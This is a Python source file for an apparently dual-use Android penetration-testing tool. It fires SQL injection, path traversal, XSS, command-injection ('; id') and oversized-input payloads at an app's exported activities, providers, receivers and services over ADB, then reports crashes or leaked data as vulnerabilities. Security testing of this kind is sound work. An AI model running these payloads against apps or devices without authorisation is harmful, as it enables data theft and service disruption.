"""Comprehensive ADB-driven component prober.

Attacks all exported Android components directly via ADB – no UI interaction
required.  Probes Activities, ContentProviders, BroadcastReceivers and Services
with security payloads and analyses the output for vulnerability evidence.
"""

import logging
import re
import subprocess
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# --------------------------------------------------------------------------- #
# Data model                                                                   #
# --------------------------------------------------------------------------- #

@dataclass
class ProbeResult:
    """Result of a single component probe attempt."""
    component: str
    component_type: str      # "activity" | "service" | "receiver" | "provider"
    probe_type: str          # "sqli" | "path_traversal" | "null_intent" | "xss" | "crash" | "dos"
    payload: str
    raw_output: str
    is_vulnerable: bool
    severity: str            # "critical" | "high" | "medium" | "low" | "info"
    evidence: str
    poc_command: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            "component": self.component,
            "component_type": self.component_type,
            "probe_type": self.probe_type,
            "payload": self.payload,
            "is_vulnerable": self.is_vulnerable,
            "severity": self.severity,
            "evidence": self.evidence,
            "poc_command": self.poc_command,
        }


# --------------------------------------------------------------------------- #
# Payload constants                                                            #
# --------------------------------------------------------------------------- #

_SQLI_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "1 UNION SELECT name,sql,3 FROM sqlite_master--",
    "1 UNION SELECT 1,2,group_concat(tbl_name) FROM sqlite_master--",
    "' AND 1=2 UNION SELECT 1,2,3--",
    "'; INSERT INTO log VALUES('pwned');--",
    "1) OR (1=1",
]

_STRING_INJECT_PAYLOADS: List[Tuple[str, str]] = [
    # (probe_type, payload)
    ("sqli",          "' OR '1'='1"),
    ("sqli",          "1 UNION SELECT 1,2,sqlite_version()--"),
    ("path_traversal","../../../data/data/"),
    ("path_traversal","..%2F..%2F..%2Fetc%2Fpasswd"),
    ("xss",           "<script>alert(1)</script>"),
    ("xss",           "'><img src=x onerror=alert(1)>"),
    ("command_injection", "; id"),
    ("dos",           "A" * 2048),
]

_URI_INJECT_PAYLOADS: List[Tuple[str, str]] = [
    ("sqli",          "' OR '1'='1'--"),
    ("path_traversal","/../../../data/data/"),
    ("null_byte",     "%00"),
]

_INTENT_EXTRA_KEYS = ["data", "url", "id", "query", "name", "value", "path", "file", "cmd"]

# Patterns in ContentProvider output that indicate SQLi success
_SQLI_SUCCESS_PATTERNS = [
    re.compile(r'sqlite_master', re.I),
    re.compile(r'CREATE\s+TABLE', re.I),
    re.compile(r'tbl_name', re.I),
    re.compile(r'pwned', re.I),
    re.compile(r'sqlite_version', re.I),
    re.compile(r'Row #\d+', re.I),          # content query output
    re.compile(r'\|\s*\w+\s*\|', re.I),    # table-like output
]

_CRASH_PATTERNS = [
    re.compile(r'exception', re.I),
    re.compile(r'has stopped', re.I),
    re.compile(r'force.?close', re.I),
    re.compile(r'AndroidRuntime', re.I),
    re.compile(r'Process.*died', re.I),
    re.compile(r'FATAL\s+EXCEPTION', re.I),
    re.compile(r'Caused by:', re.I),
    re.compile(r'NullPointerException', re.I),
    re.compile(r'IllegalArgument', re.I),
    re.compile(r'SecurityException', re.I),
]

_ERROR_PATTERNS = [
    re.compile(r'error', re.I),
    re.compile(r'denied', re.I),
    re.compile(r'permission', re.I),
]


# --------------------------------------------------------------------------- #
# Main class                                                                   #
# --------------------------------------------------------------------------- #

class ComponentProber:
    """Attack all exported Android components directly via ADB.

    Does not require UI interaction – probes component surfaces at the Intent
    / ContentProvider level.

    Args:
        package: Target application package name.
        device_serial: ADB device serial (None = use default device).
        adb_runner: Optional callable(args: list) -> (rc, stdout, stderr).
                    Defaults to internal subprocess-based runner.
    """

    def __init__(self, package: str, device_serial: Optional[str] = None,
                 adb_runner: Optional[Callable[[List[str]], Tuple[int, str, str]]] = None):
        self._package = package
        self._device_serial = device_serial
        self._adb_runner = adb_runner or self._default_adb_runner

    # ------------------------------------------------------------------ #
    # Public API                                                          #
    # ------------------------------------------------------------------ #

    def probe_all(self, manifest_components: Dict[str, Any]) -> List[ProbeResult]:
        """Probe all exported components described in the manifest dict.

        Args:
            manifest_components: Dict with keys:
                "activities": list of dicts with "name" and "intent_filters"
                "providers":  list of dicts with "authority" and "paths"
                "receivers":  list of dicts with "name" and "actions"
                "services":   list of dicts with "name"

        Returns:
            Aggregated list of ProbeResult objects.
        """
        results: List[ProbeResult] = []

        for activity in manifest_components.get("activities", []):
            name = activity.get("name", "")
            filters = activity.get("intent_filters", [])
            if name:
                results.extend(self.probe_activity(name, filters))

        for provider in manifest_components.get("providers", []):
            authority = provider.get("authority", "")
            paths = provider.get("paths", [])
            if authority:
                results.extend(self.probe_content_provider(authority, paths))

        for receiver in manifest_components.get("receivers", []):
            name = receiver.get("name", "")
            actions = receiver.get("actions", [])
            if name:
                results.extend(self.probe_broadcast_receiver(name, actions))

        for service in manifest_components.get("services", []):
            name = service.get("name", "")
            if name:
                results.extend(self.probe_service(name))

        vuln_count = sum(1 for r in results if r.is_vulnerable)
        logger.info(
            "probe_all: %d results, %d potential vulnerabilities across %d components",
            len(results), vuln_count,
            len(manifest_components.get("activities", [])) +
            len(manifest_components.get("providers", [])) +
            len(manifest_components.get("receivers", [])) +
            len(manifest_components.get("services", [])),
        )
        return results

    # ------------------------------------------------------------------ #
    # Component-specific probers                                          #
    # ------------------------------------------------------------------ #

    def probe_activity(self, component: str, intent_filters: list) -> List[ProbeResult]:
        """Probe an exported Activity.

        Sends:
        1. Null intent (crash test)
        2. String injection payloads in common extra keys
        3. Path traversal in string extras
        4. XSS payloads in string extras
        5. Oversized input (DoS)
        6. Deeplink URI injection (if scheme/host is in intent_filters)
        """
        results: List[ProbeResult] = []
        full_component = self._full_component_name(component)

        # 1. Null intent
        null_cmd_args = ["shell", "am", "start", "-n", full_component]
        rc, stdout, stderr = self._run_adb(null_cmd_args)
        combined = (stdout + stderr).strip()
        crash = self._check_crash_in_output(combined) or self._check_crash(self._package)
        results.append(ProbeResult(
            component=full_component,
            component_type="activity",
            probe_type="null_intent",
            payload="(empty intent)",
            raw_output=combined[:1000],
            is_vulnerable=crash,
            severity="high" if crash else "info",
            evidence="App crashed or raised exception on null intent" if crash else "No crash detected",
            poc_command=self._fmt_adb_cmd(null_cmd_args),
        ))

        # 2-5. String payloads in extra keys
        for extra_key in _INTENT_EXTRA_KEYS:
            for probe_type, payload in _STRING_INJECT_PAYLOADS:
                cmd_args = [
                    "shell", "am", "start", "-n", full_component,
                    "--es", extra_key, payload,
                ]
                rc, stdout, stderr = self._run_adb(cmd_args)
                combined = (stdout + stderr).strip()
                crash = self._check_crash_in_output(combined) or self._check_crash(self._package)

                is_vuln = crash
                severity = "high" if crash else "low"
                evidence = f"Crash/exception when injecting '{probe_type}' payload via extra '{extra_key}'" if crash else "No observable reaction"

                # For XSS, any reflection in a WebView counts as potential
                if probe_type == "xss" and not crash:
                    if re.search(r'alert|script|onerror', combined, re.I):
                        is_vuln = True
                        severity = "medium"
                        evidence = "Payload reflected in output"

                results.append(ProbeResult(
                    component=full_component,
                    component_type="activity",
                    probe_type=probe_type,
                    payload=payload,
                    raw_output=combined[:500],
                    is_vulnerable=is_vuln,
                    severity=severity,
                    evidence=evidence,
                    poc_command=self._fmt_adb_cmd(cmd_args),
                ))

        # 6. Deeplink URI injection
        schemes = self._extract_schemes(intent_filters)
        for scheme in schemes:
            for uri_probe_type, uri_suffix in _URI_INJECT_PAYLOADS:
                uri = f"{scheme}://host{uri_suffix}"
                cmd_args = ["shell", "am", "start", "-a", "android.intent.action.VIEW", "-d", uri]
                rc, stdout, stderr = self._run_adb(cmd_args)
                combined = (stdout + stderr).strip()
                crash = self._check_crash_in_output(combined) or self._check_crash(self._package)

                results.append(ProbeResult(
                    component=full_component,
                    component_type="activity",
                    probe_type=f"deeplink_{uri_probe_type}",
                    payload=uri,
                    raw_output=combined[:500],
                    is_vulnerable=crash,
                    severity="high" if crash else "low",
                    evidence=f"Crash on deeplink URI injection: {uri}" if crash else "No crash",
                    poc_command=self._fmt_adb_cmd(cmd_args),
                ))

        return results

    def probe_content_provider(self, authority: str, paths: list) -> List[ProbeResult]:
        """Probe an exported ContentProvider with SQLi, path traversal and null bytes.

        Sends SQL injection payloads via:
        - URI path component
        - --where (selection) argument
        - query parameter in URI
        """
        results: List[ProbeResult] = []
        base_uri = f"content://{authority}"

        # Enumerate paths to probe; fall back to root if none provided
        probe_paths = list(paths) if paths else [""]
        if "" not in probe_paths:
            probe_paths.insert(0, "")

        for path in probe_paths:
            path = path.lstrip("/")
            path_segment = f"/{path}" if path else ""

            # A. SQLi via --where (selection clause)
            for sqli_payload in _SQLI_PAYLOADS:
                uri = f"{base_uri}{path_segment}"
                cmd_args = [
                    "shell", "content", "query",
                    "--uri", uri,
                    "--where", sqli_payload,
                ]
                rc, stdout, stderr = self._run_adb(cmd_args, timeout=15)
                combined = (stdout + stderr).strip()

                result = self._analyze_provider_response(
                    authority, "provider", "sqli", sqli_payload, combined,
                    cmd_args,
                )
                results.append(result)

            # B. SQLi via URI path injection
            for sqli_payload in _SQLI_PAYLOADS[:3]:
                encoded = sqli_payload.replace(" ", "%20").replace("'", "%27")
                uri = f"{base_uri}{path_segment}/{encoded}"
                cmd_args = ["shell", "content", "query", "--uri", uri]
                rc, stdout, stderr = self._run_adb(cmd_args, timeout=15)
                combined = (stdout + stderr).strip()

                result = self._analyze_provider_response(
                    authority, "provider", "sqli_uri", sqli_payload, combined, cmd_args,
                )
                results.append(result)

            # C. Path traversal in URI
            for traversal in ["/../../../data/data/", "/%2e%2e/%2e%2e/data/", "/%00"]:
                uri = f"{base_uri}{path_segment}{traversal}"
                cmd_args = ["shell", "content", "query", "--uri", uri]
                rc, stdout, stderr = self._run_adb(cmd_args, timeout=10)
                combined = (stdout + stderr).strip()

                # A successful path traversal often returns file data or at minimum
                # does not return a "permission denied" / "unknown URI" error
                is_vuln = bool(
                    combined and
                    not re.search(r'unknown uri|no permission|permission denied|invalid uri', combined, re.I)
                    and not self._is_empty_output(combined)
                )
                results.append(ProbeResult(
                    component=authority,
                    component_type="provider",
                    probe_type="path_traversal",
                    payload=uri,
                    raw_output=combined[:600],
                    is_vulnerable=is_vuln,
                    severity="high" if is_vuln else "info",
                    evidence=f"Provider returned data for traversal URI {uri}" if is_vuln else "No data returned",
                    poc_command=self._fmt_adb_cmd(cmd_args),
                ))

            # D. Null byte injection
            null_uri = f"{base_uri}{path_segment}/%00"
            cmd_args = ["shell", "content", "query", "--uri", null_uri]
            rc, stdout, stderr = self._run_adb(cmd_args, timeout=10)
            combined = (stdout + stderr).strip()
            crash = self._check_crash_in_output(combined)
            results.append(ProbeResult(
                component=authority,
                component_type="provider",
                probe_type="null_byte",
                payload=null_uri,
                raw_output=combined[:500],
                is_vulnerable=crash,
                severity="medium" if crash else "info",
                evidence="Null byte caused exception in ContentProvider" if crash else "No crash",
                poc_command=self._fmt_adb_cmd(cmd_args),
            ))

        return results

    def probe_broadcast_receiver(self, component: str, actions: list) -> List[ProbeResult]:
        """Probe an exported BroadcastReceiver.

        For each registered action:
        1. Empty intent with the action
        2. Intent with null/empty extras
        3. Intent with injection payloads in common extra keys
        """
        results: List[ProbeResult] = []
        full_component = self._full_component_name(component)

        if not actions:
            # Generic broadcast with no action
            actions = ["android.intent.action.MAIN"]

        for action in actions:
            # 1. Empty intent
            cmd_args = ["shell", "am", "broadcast", "-a", action, "-n", full_component]
            rc, stdout, stderr = self._run_adb(cmd_args)
            combined = (stdout + stderr).strip()
            crash = self._check_crash_in_output(combined) or self._check_crash(self._package)
            results.append(ProbeResult(
                component=full_component,
                component_type="receiver",
                probe_type="null_intent",
                payload=f"action={action}",
                raw_output=combined[:500],
                is_vulnerable=crash,
                severity="medium" if crash else "info",
                evidence="Receiver crashed on empty intent" if crash else "Broadcast sent",
                poc_command=self._fmt_adb_cmd(cmd_args),
            ))

            # 2+3. Injection payloads in extras
            for extra_key in _INTENT_EXTRA_KEYS[:4]:  # Limit to reduce noise
                for probe_type, payload in _STRING_INJECT_PAYLOADS[:4]:
                    cmd_args = [
                        "shell", "am", "broadcast",
                        "-a", action,
                        "-n", full_component,
                        "--es", extra_key, payload,
                    ]
                    rc, stdout, stderr = self._run_adb(cmd_args)
                    combined = (stdout + stderr).strip()
                    crash = self._check_crash_in_output(combined) or self._check_crash(self._package)
                    results.append(ProbeResult(
                        component=full_component,
                        component_type="receiver",
                        probe_type=probe_type,
                        payload=payload,
                        raw_output=combined[:400],
                        is_vulnerable=crash,
                        severity="high" if crash else "low",
                        evidence=f"Receiver crashed with payload in '{extra_key}'" if crash else "No crash",
                        poc_command=self._fmt_adb_cmd(cmd_args),
                    ))

        return results

    def probe_service(self, component: str) -> List[ProbeResult]:
        """Probe an exported Service.

        1. Start with empty intent
        2. Start with injection payloads in common extras
        3. Bind attempt (best-effort via am startservice)
        """
        results: List[ProbeResult] = []
        full_component = self._full_component_name(component)

        # 1. Start with empty intent
        cmd_args = ["shell", "am", "startservice", "-n", full_component]
        rc, stdout, stderr = self._run_adb(cmd_args)
        combined = (stdout + stderr).strip()
        crash = self._check_crash_in_output(combined) or self._check_crash(self._package)
        results.append(ProbeResult(
            component=full_component,
            component_type="service",
            probe_type="null_intent",
            payload="(empty intent)",
            raw_output=combined[:500],
            is_vulnerable=crash,
            severity="medium" if crash else "info",
            evidence="Service crashed or exception on empty intent" if crash else "Service started (or refused)",
            poc_command=self._fmt_adb_cmd(cmd_args),
        ))

        # 2. Injection payloads
        for extra_key in _INTENT_EXTRA_KEYS[:3]:
            for probe_type, payload in _STRING_INJECT_PAYLOADS[:4]:
                cmd_args = [
                    "shell", "am", "startservice", "-n", full_component,
                    "--es", extra_key, payload,
                ]
                rc, stdout, stderr = self._run_adb(cmd_args)
                combined = (stdout + stderr).strip()
                crash = self._check_crash_in_output(combined) or self._check_crash(self._package)
                results.append(ProbeResult(
                    component=full_component,
                    component_type="service",
                    probe_type=probe_type,
                    payload=payload,
                    raw_output=combined[:400],
                    is_vulnerable=crash,
                    severity="high" if crash else "low",
                    evidence=f"Service crashed with payload in extra '{extra_key}'" if crash else "No crash",
                    poc_command=self._fmt_adb_cmd(cmd_args),
                ))

        return results

    # ------------------------------------------------------------------ #
    # ADB runner                                                          #
    # ------------------------------------------------------------------ #

    def _run_adb(self, args: List[str], timeout: int = 10) -> Tuple[int, str, str]:
        """Run an ADB command and return (returncode, stdout, stderr).

        Uses the injected adb_runner if provided, otherwise the default
        subprocess-based implementation.

        Args:
            args: ADB sub-command arguments (without the leading "adb").
            timeout: Maximum seconds to wait.

        Returns:
            (returncode, stdout, stderr) tuple.
        """
        return self._adb_runner(args, timeout)

    def _default_adb_runner(self, args: List[str], timeout: int = 10) -> Tuple[int, str, str]:
        """Default subprocess-based ADB runner."""
        cmd = ["adb"]
        if self._device_serial:
            cmd += ["-s", self._device_serial]
        cmd += args

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            logger.debug("ADB command timed out: %s", cmd)
            return -1, "", "timeout"
        except FileNotFoundError:
            logger.error("'adb' not found on PATH")
            return -1, "", "adb not found"
        except Exception as exc:
            logger.debug("ADB command failed: %s – %s", cmd, exc)
            return -1, "", str(exc)

    # ------------------------------------------------------------------ #
    # Crash detection                                                     #
    # ------------------------------------------------------------------ #

    def _check_crash(self, package: str) -> bool:
        """Check whether the app crashed by inspecting logcat for recent errors.

        Uses a short logcat window (1 second) to avoid blocking the prober.

        Args:
            package: Package name to filter.

        Returns:
            True if a crash/exception is detected.
        """
        time.sleep(0.8)  # Let logcat catch up
        rc, stdout, stderr = self._run_adb(
            ["logcat", "-d", "-t", "50", f"*:E"],
            timeout=8,
        )
        combined = stdout + stderr
        if package and package not in combined:
            # No mention of this package in recent errors
            # Still check for generic crash indicators
            for pat in _CRASH_PATTERNS:
                if pat.search(combined):
                    return True
            return False

        for pat in _CRASH_PATTERNS:
            if pat.search(combined):
                return True
        return False

    def _check_crash_in_output(self, output: str) -> bool:
        """Check if a crash/exception pattern is present in command output."""
        for pat in _CRASH_PATTERNS:
            if pat.search(output):
                return True
        return False

    # ------------------------------------------------------------------ #
    # ContentProvider response analysis                                   #
    # ------------------------------------------------------------------ #

    def _analyze_provider_response(
        self,
        authority: str,
        component_type: str,
        probe_type: str,
        payload: str,
        output: str,
        cmd_args: List[str],
    ) -> ProbeResult:
        """Analyse a ContentProvider query response for SQLi evidence.

        Args:
            authority: ContentProvider authority.
            component_type: "provider".
            probe_type: "sqli" or "sqli_uri".
            payload: The payload used.
            output: Combined stdout + stderr from the adb command.
            cmd_args: The ADB args used (for PoC command).

        Returns:
            ProbeResult with vulnerability assessment.
        """
        is_vuln = False
        evidence = "No SQLi evidence found"
        severity = "info"

        # Check for schema/data leakage patterns
        for pat in _SQLI_SUCCESS_PATTERNS:
            if pat.search(output):
                is_vuln = True
                evidence = f"SQLi indicator '{pat.pattern}' found in ContentProvider response"
                severity = "critical"
                break

        # Check for error messages that reveal DB structure (still info-level)
        if not is_vuln and re.search(r'syntax error|near.*error|unrecognized token', output, re.I):
            is_vuln = True
            evidence = "SQL syntax error in response – provider may be injectable"
            severity = "high"

        # Crash = at minimum medium
        if not is_vuln and self._check_crash_in_output(output):
            is_vuln = True
            evidence = "ContentProvider crashed on SQLi payload"
            severity = "high"

        return ProbeResult(
            component=authority,
            component_type=component_type,
            probe_type=probe_type,
            payload=payload,
            raw_output=output[:800],
            is_vulnerable=is_vuln,
            severity=severity,
            evidence=evidence,
            poc_command=self._fmt_adb_cmd(cmd_args),
        )

    # ------------------------------------------------------------------ #
    # Utility helpers                                                     #
    # ------------------------------------------------------------------ #

    def _full_component_name(self, component: str) -> str:
        """Ensure component is fully qualified: package/ComponentClass."""
        if "/" in component:
            return component
        if component.startswith("."):
            return f"{self._package}/{self._package}{component}"
        if component.startswith(self._package):
            return f"{self._package}/{component}"
        return f"{self._package}/{component}"

    def _extract_schemes(self, intent_filters: list) -> List[str]:
        """Extract URI schemes from a list of intent filter dicts.

        Accepts filters in the forms:
        - {"scheme": "myapp"}
        - {"data": [{"scheme": "myapp"}]}
        - {"actions": [...], "data": {"scheme": "myapp"}}
        """
        schemes: List[str] = []
        for flt in intent_filters:
            if not isinstance(flt, dict):
                continue
            # Direct scheme key
            if "scheme" in flt:
                s = flt["scheme"]
                if s and s not in schemes:
                    schemes.append(s)
            # Nested data list
            data = flt.get("data", [])
            if isinstance(data, dict):
                data = [data]
            if isinstance(data, list):
                for d in data:
                    if isinstance(d, dict) and "scheme" in d:
                        s = d["scheme"]
                        if s and s not in schemes:
                            schemes.append(s)
        return schemes

    def _fmt_adb_cmd(self, args: List[str]) -> str:
        """Format the full ADB command string for PoC output."""
        parts = ["adb"]
        if self._device_serial:
            parts += ["-s", self._device_serial]
        parts += args
        # Quote arguments that contain spaces or special chars
        quoted = []
        for part in parts:
            if any(c in part for c in (" ", "'", "\"", "&", "|", ";", "<", ">")):
                quoted.append(f"'{part}'")
            else:
                quoted.append(part)
        return " ".join(quoted)

    def _is_empty_output(self, output: str) -> bool:
        """Return True if the output contains only whitespace or no rows."""
        stripped = output.strip()
        if not stripped:
            return True
        empty_indicators = ["0 rows", "no rows", "row 0"]
        lower = stripped.lower()
        return any(ind in lower for ind in empty_indicators)
